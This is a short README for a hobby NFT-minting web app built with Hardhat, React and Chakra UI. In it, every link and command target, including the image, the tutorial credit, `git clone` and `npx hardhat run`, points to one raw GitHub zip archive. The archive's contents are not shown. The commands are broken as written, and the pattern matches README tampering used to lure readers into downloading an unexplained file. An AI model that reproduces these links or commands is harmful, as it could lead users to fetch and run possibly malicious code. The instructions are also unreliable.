<img width="567" alt="Screen Shot 2022-06-24 at 11 38 19" src="https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip">

# NFTRolls

This project demonstrates a basic Web3 Dapp for minting NFTs. Mostly referring to the [Web3 Tutorial](https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip) created by [@fireship-io](https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip), but with some great UI overhaul. It comes with an ERC721 contract, a test without actual testing (I'm too lazy for that), a script that deploys that contract, and a front-end application built with react and Chakra UI, which can mint some rick roll images.

Clone the project:

```shell
git clone https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip
```

To compile and serve the contract on a local blockchain instance (Polygon testnet is used on this project btw):

```shell
# Terminal tab 1
npx hardhat compile
npx hardhat node

# Terminal tab 2
npx hardhat run https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip --network localhost
```

To run the front-end application on a local development server:

```shell
# Terminal tab 3
vim .env      # Create your .env file with your own VITE_CONTENT_ID and VITE_CONTRACT_ADDRESS.
              # If needed, also VITE_FILE_EXTENSION of your preference.

npm run dev   # start up the development server
```
